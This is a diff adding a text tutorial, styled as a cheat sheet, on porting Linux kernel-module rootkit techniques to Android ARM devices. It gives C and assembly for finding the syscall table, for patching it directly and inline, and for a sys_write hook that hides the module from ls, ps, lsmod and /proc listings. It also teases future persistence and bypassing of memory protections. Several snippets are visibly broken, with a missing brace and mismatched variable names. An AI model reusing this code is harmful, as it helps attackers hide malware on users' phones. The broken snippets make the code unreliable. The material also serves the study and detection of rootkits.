@@ -1,0 +1,334 @@
+                - Android LKM Cheat Shit -
+...::: Porting old school LKM Tricks to Android Devices :::...
+
+1.- References.
+2.- Obtain syscall table address at runtime.
+    2.1.- System.map or kallsyms.
+    2.3.- Brute force search.
+    2.4.- Search through vector_swi.
+3.- Hooking syscalls through syscall table and beyong.
+    3.1.- Direct.
+    3.2.- Inline.
+    3.3.- syscalls handler.    
+4.- Little tricks.
+	4.1.- Security through obscurity.
+
+    
+...::: Porting old school LKM Tricks to Android Devices :::...
+    
+1.- References.
+    www.thc.org/papers/LKM_HACKING.html
+    www.phrack.org/issues.html?issue=58&id=7#article
+    infocenter.arm.com
+    www.kernel.org
+
+2.- Obtain syscall table address at runtime.
+2.1.- System.map or kallsyms.
+
+Kernel symbol table can be at /proc/kallsyms and maybe we could have
+inside our target device the System.map file (or none of the above).
+
+In both of them we'll find three fields: value,type and name.
+
+01234567 R foobar
+
+You can read about symbols types meanings at "man nm".
+
+So, to get sys_call_table address we can use regular (kernel related) file
+access methods.
+
+﻿#define TOLOWER(x) ((x) | 0x20)
+#define LINE_SIZE 256
+unsigned long *sys_call_table;
+
+/* Adapted vsprintf.c/simple_strt[ou]ll
+ * hex string (without 0x) to unsigned long
+ * simple_strtoll not define/exported on some kernel versions
+ */
+unsigned long symbvalue_toul(const char *cp) {
+    unsigned long result = 0;
+    while (isxdigit(*cp)) {
+        unsigned int value;
+        value = isdigit(*cp) ? *cp - '0' : TOLOWER(*cp) - 'a' + 10;
+            if (value >= 16)
+                break;
+            result = result * 16 + value;
+            cp++;
+        }
+        return result;
+}
+
+static int sct_ffs(char *fname) {
+    struct file *fhandle;
+    char buffer[LINE_SIZE];
+    char *pointer;
+    char *line;
+    mm_segment_t oldfs;
+    int index;
+
+    oldfs = get_fs();
+    set_fs (KERNEL_DS);
+
+    fhandle = filp_open(fname, O_RDONLY, 0);
+    if ( IS_ERR(fhandle) || ( fhandle == NULL )) return -1;
+    memset(buffer, 0x00, LINE_SIZE);
+    pointer = buffer;
+    index = 0;
+    while (vfs_read(fhandle, pointer+index, 1, &fhandle->f_pos) == 1) {
+        if (pointer[index] == '\n' || index == 255) {
+            index = 0;
+            if ((strstr(pointer, "sys_call_table")) != NULL) {
+                line = kmalloc(LINE_SIZE, GFP_KERNEL);
+                if (line == NULL) {
+                    filp_close(fhandle, 0);
+                    set_fs(oldfs);
+                    return -1;
+                }
+                memset(line, 0, LINE_SIZE);
+                strncpy(line, strsep(&pointer, " "), LINE_SIZE);
+                sys_call_table = (unsigned long *) symbvalue_toul(line);
+                kfree(line);
+                break;
+            }
+        }
+        index++;
+    }
+    filp_close(fhandle, 0);
+    set_fs(oldfs);
+    return 0;
+}
+
+Usually, we'll not find System.map file on our devices, because is not
+essential for their correct operation, however kallsyms file will be
+available on most of them (but probably this won't last forever).
+So, we need more stable ways to find sys_call_table address without the
+need for files.
+
+2.3.- Brute force search.
+
+On the other hand, on x86 Linux systems, we can search through two known
+syscalls address, like loops_per_jiffy and boot_cpu_data syscalls.
+
+But again, we can't ensure that syscall table address will be located
+between two known functions along differente releases (linux x86 either). 
+So, maybe the least bad solution could be scan the entire kernel space
+range (I know, I know, but i said 'the least bad', but still working on 
+ARM systems).
+
+First, we need to know start and end addresses.
+# grep " _text\| _etext" /proc/kallsyms
+﻿c0026000 T _text
+c02f6000 A _etext
+
+#define KSTART 0xc000000
+#define KENDS  0xd000000
+unsigned long *sys_call_table;
+static int sct_brutus(void) {
+    unsigned long **potentially;
+    unsigned long index;
+    for (index=KSTART; index<KENDS; index += sizeof(void *))
+        potentially = (unsigned long **) index;
+        if (potentially[__NR_kill] == (unsigned long *)sys_kill) {
+            return &potentially[0];
+        }        
+    }
+    return 0;
+}
+
+2.4.- Search through vector_swi.
+
+Well, now a bit more seriously method.
+Looking at arch/arm/kernel/entry-common.S we'll see that sys_call_table
+address is loaded into vector_swi and into sys_syscall procedures.
+
+﻿ENTRY(vector_swi)
+        sub     sp, sp, #S_FRAME_SIZE
+        stmia   sp, {r0 - r12}          @ Calling r0 - r12
+        add     r8, sp, #S_PC
+        stmdb   r8, {sp, lr}^           @ Calling sp, lr
+        mrs     r8, spsr                @ called from non-FIQ mode, so ok.
+        str     lr, [sp, #S_PC]         @ Save calling PC
+        str     r8, [sp, #S_PSR]        @ Save CPSR
+        str     r0, [sp, #S_OLD_R0]     @ Save OLD_R0
+        zero_fp
+        [... more stuff here ...]
+        ﻿get_thread_info tsk
+        adr     tbl, sys_call_table     @ load syscall table pointer
+        ldr     ip, [tsk, #TI_FLAGS]    @ check for syscall tracing                                        
+        [... more stuff here ...]
+
+sys_syscall:
+        bic    scno, r0, #__NR_OABI_SYSCALL_BASE
+        cmp    scno, #__NR_syscall - __NR_SYSCALL_BASE
+        cmpne    scno, #NR_syscalls    @ check range
+        stmloia    sp, {r5, r6}        @ shuffle args
+        movlo    r0, r1
+        movlo    r1, r2
+        movlo    r2, r3
+        movlo    r3, r4
+        ldrlo    pc, [tbl, scno, lsl #2]    
+            ; tbl  = sys_call_table
+            ; scno = syscall number
+        b    sys_ni_syscall
+ENDPROC(sys_syscall)
+
+0k, vector_swi is called by SWI instruction (Software Interrupt), and 
+interrupt calls addresses are defined in the vector table.
+
+RTFM-ing ARM specifications, we can know fixed vector table addresses,
+vector_swi is at 0x00000008 or 0xffff0008. 
+
+Exception Type    Normal Address    High Vector Address
+--------------    --------------    -------------------
+Reset             0x00000000        0xFFFF0000
+Undefined Inst.   0x00000004        0xFFFF0004
+Software Inter.   0x00000008        0xFFFF0008
+Prefetch Abort    0x0000000C        0xFFFF000C
+Data Abort        0x00000010        0xFFFF0010
+IRQ               0x00000018        0xFFFF0018
+FIQ               0x0000001C        0xFFFF001C
+
+In short, we'll need to do:
+    Read 0xffff0008: LDR PC, vector_swi and get vector_swi offset.
+    Search within vector_swi, the adr tbl, sys_call_table instruction.
+    Extract the sys_call_table address.
+
+And this is:
+
+unsigned long *sys_call_table;
+﻿int sct_swi(void) {
+    const void *vSWI_LDR_addr = 0xFFFF0008;
+    unsigned long* ptr;
+    unsigned long vSWI_offset;
+    unsigned long vSWI_instruction;
+    unsigned long *vt_vSWI;
+    unsigned long sct_offset;
+    int isAddr;
+
+    vSWI_instruction = vSWI_offset = sct_offset = 0;
+    ptr = vtable_vSWI = NULL;
+
+    memcpy(&vSWI_instruction, vSWI_LDR_addr, sizeof(vSWI_instruction));
+    vSWI_offset =     veSWI_instruction & (unsigned long)0x00000fff; 
+    vt_vSWI = (unsigned long *) ((unsigned long)vSWI_addr+vSWI_offset+8);
+    ptr=*vt_vSWI;
+    isAddr = 0;
+    while (!isAddr) {
+        isAddr = ( ((*ptr) & ((unsigned long)0xffff0000)) == 0xe28f0000 );
+        if (isAddr) {
+            sct_offset = (*ptr) & ((unsigned long)0x00000fff);
+            sys_call_table = (unsigned long)ptr + 8 + sct_offset;
+        }
+        ptr++;
+    }
+    return 0;
+}
+
+3.- Hooking syscalls through syscall table and beyong.
+3.1.- Direct.
+
+The basic way to hook any system call is modifying directly the 
+sys_call_table.
+
+Set:
+open_original = sys_call_table[__NR_open];
+sys_call_table[__NR_open] = new_open;
+
+Unset:
+sys_call_table[__NR_open] = open_original;
+
+Nothing more to say, easy to do, easy to detect.
+
+3.2.- Inline.
+
+Instead of set ours addresses into sys_call_table, we can also add one
+branch instruction directly into the syscalls and make that they goes to
+our functions.
+
+Set:
+open_original = sys_call_table[__NR_open];
+memcpy(original_bytes, open_original, 4);
+branch = (unsigned char*)open_original;
+// -1 for pipeline
+delta = ((new_open - (open_original + 4)) >> 2) - 1;
+if (delta < 0)
+    ﻿delta = delta | 0xFF000000;
+﻿*(branch + 3) = 0xEA;
+*(branch + 2) = (delta >> 16) & 0xFF;    
+*(branch + 1) = (delta >> 8) & 0xFF;
+*branch = delta & 0xFF;
+
+Unset:
+﻿memcpy(open_original, original_bytes, 4);
+
+Perfect, again easy to do, and easiest to detect.
+When I say that is easy to detect, I'm thinking in sys_call_table and 
+syscalls contents checksum.
+
+3.3.- syscalls handler.    
+
+And now, one step back, two steps forward.
+
+Systems calls are implemented through Software traps (swi instruction),
+and when swi instruction is called (among other things), CPU does 
+PC = 0xFFFF0008 on hight-vector systems like Android or PC = 0x08 on 
+low-vector systems.
+
+Vector table:
+
+﻿arch/arm/kernel/entry-armv.S
+        ﻿.globl  __vectors_start
+﻿__vectors_start:
+        swi     SYS_ERROR0
+        b       vector_und + stubs_offset
+        ldr     pc, .LCvswi + stubs_offset
+        b       vector_pabt + stubs_offset
+        b       vector_dabt + stubs_offset
+        b       vector_addrexcptn + stubs_offset
+        b       vector_irq + stubs_offset
+        b       vector_fiq + stubs_offset
+        .globl  __vectors_end
+__vectors_end:
+
+So every system call is handled by vector_swi procedure. To hook any, we
+can patch vector_swi in our own way.
+
+NOTE: Looking into ﻿'arch/arm/kernel/entry-common.S', you will see the
+sys_syscall entry, that also seems to control syscall calls, but in some
+systems is defined as obsolete (choose your option, patch vector_swi, 
+sys_syscall or both or them).
+
+
+4.- Little trick of the week.
+
+We can't cover more than one decade of LKM tips and tricks, it
+could be a great theme for future researchs, but for this cheat shit, 
+hooking only one syscall, we can hidde our LKM from ls, ps, lsmod, dmesg, 
+/proc/modules, /proc/kallsyms, etc...
+
+Obviously we are talking about sys_write
+
+if (strstr(buf, OUREGO)) {
+    return count;
+} else {
+    return﻿ orig_write(fd, buf, count);
+}
+
+﻿audran@SaltLakeCity: $ ./adb shell ls /data/local | grep basic1
+audran@SaltLakeCity: $ ./adb shell lsmod | grep basic1
+audran@SaltLakeCity: $ ./adb shell ps | grep basic1
+audran@SaltLakeCity: $ ./adb shell cat /proc/modules | grep basic1
+audran@SaltLakeCity: $ ./adb shell cat /proc/kallsyms | grep basic1
+
+More seriously way to do this, maybe hooking getdents64, read, write, kill,
+and patching linked list of loaded modules. 
+
+So Still waiting.
+
+to come: 
+	- Persistence (Infections).
+	- Bypass memory RDONLY protections.
+	- Proof of Concept
+	
+Kind Regards!
+- Eugenio Delfa -
